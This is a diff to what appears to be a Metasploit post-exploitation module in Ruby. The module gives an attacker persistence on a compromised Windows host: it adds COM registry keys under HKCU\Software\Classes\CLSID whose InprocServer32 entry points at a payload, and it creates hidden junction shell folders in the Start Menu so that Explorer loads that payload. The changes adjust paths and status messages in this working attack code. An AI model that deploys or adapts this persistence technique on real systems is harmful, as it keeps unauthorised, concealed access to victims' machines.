@@ -175,7 +175,7 @@ def run
   # variable declarations ..
   app_path = datastore['APP_PATH'] # /root/payload.exe
   fol_path = datastore['FOLDER_PATH'] # C:\\Users\<username>\Desktop\POC
-  hive_key = "HKCU\\Software\\Classes\\CLSID" # uac hive key (CLSID)
+  hive_key = "HKCU\\Software\\Classes\\CLSID\\" # uac hive key (CLSID)
   #
   # check for proper config settings enter
   # to prevent 'unset all' from deleting default options ..
@@ -215,19 +215,22 @@ def run
     if session.fs.file.exist?(app_path)
       print_good("Application (payload) found ..")
     else
-      print_error("Application not found: #{app_path}")
-      print_warning("Deploy your payload before using this module")
+      print_error("Not found: #{app_path}")
+      print_warning("Deploy your [payload] before using this module ..")
+      print_warning("OR point to one existing application full path ..")
       print_line("")
       Rex::sleep(1.0)
       return nil
     end
 
 
-      # store user name into a variable
+      # store %AppData% directory full path ..
+      data = client.fs.file.expand_path("%AppData%")
+      # store username into a variable
       print_status("Retriving target username ..")
       Rex::sleep(1.0)
-      user_name = cmd_exec("%username%")
-      # create new GUID and store it in variable
+      user_name =  client.fs.file.expand_path("%username%")
+      # create new GUID and store it in a variable
       print_status("Creating new GUID key value ..")
       Rex::sleep(1.0)
       new_GUID = cmd_exec("powershell.exe -ep -C \"[guid]::NewGuid().Guid\"")
@@ -237,7 +240,7 @@ def run
      # List of registry keys to add to target regedit ..
      #
      if datastore['PERSIST_EXPLORER'] == true
-       print_status("Persiste in explorer.exe selected ..")
+       print_status("Persiste in Explorer selected ..")
        Rex::sleep(1.0)
        hacks = [
         '#{hive_key}\\#{new_GUID}\\InprocServer32 /ve /t REG_SZ /d \"#{app_path}\" /f',
@@ -275,23 +278,25 @@ def run
 
 
          #
-         # build POC folder (juntion shell folders)  fol_path
+         # build POC folder (juntion shell folders)
          #
          if datastore['PERSIST_EXPLORER'] == true
            r=''
+           folder_poc ="\"#{data}\\Microsoft\\Windows\\Start Menu\\Programs\\Accessories\\POC.#{new_GUID}\""
            print_status("Creating juntion shell folder ..")
            Rex::sleep(1.0)
-           print_warning("Revert folder path to: %AppData%\\..\\Start Menu\\..")
+           print_warning("[Persiste In Explorer Sellected]")
+           print_warning("DIR: #{folder_poc}")
            Rex::sleep(1.0)
-           folder_poc ="mkdir \"%AppData%\\Microsoft\\Windows\\Start Menu\\Programs\\Accessories\\POC.#{new_GUID}\""
-           r = session.sys.process.execute("cmd.exe /R #{folder_poc}", nil, {'Hidden' => true, 'Channelized' => true})
+           r = session.sys.process.execute("cmd.exe /R mkdir #{folder_poc}", nil, {'Hidden' => true, 'Channelized' => true})
            r.channel.close
            r.close
          else
            r=''
-           print_status("Creating #{fol_path}")
+           print_status("Creating juntion shell folder ..")
            Rex::sleep(1.0)
            r = session.sys.process.execute("cmd.exe /R mkdir \"#{fol_path}.#{new_GUID}\"", nil, {'Hidden' => true, 'Channelized' => true})
+           print_status("DIR: #{fol_path}")
            r.channel.close
            r.close
          end
